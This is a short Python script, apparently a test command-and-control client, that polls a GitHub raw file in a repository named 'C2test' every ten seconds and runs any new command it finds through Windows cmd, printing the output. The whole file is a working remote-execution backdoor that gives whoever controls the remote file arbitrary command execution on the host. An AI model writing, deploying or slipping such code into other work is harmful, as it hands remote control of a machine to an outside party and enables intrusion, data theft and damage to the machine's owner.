import requests
import subprocess
import time

COMMAND_URL = "https://raw.githubusercontent.com/Kr4z31n/C2test/main/command.txt"

def get_remote_command():
    try:
        response = requests.get(COMMAND_URL)
        if response.status_code == 200:
            return response.text.strip()
    except requests.RequestException:
        return None
    return None

last_command = None

while True:
    command = get_remote_command()
    
    if command and command != last_command:  
        print(f"Executing in CMD: {command}")
        try:
            result = subprocess.run(["cmd", "/c", command], capture_output=True, text=True)
            print(result.stdout)
            last_command = command  
        except Exception as e:
            print(f"Error: {e}")

    time.sleep(10)  
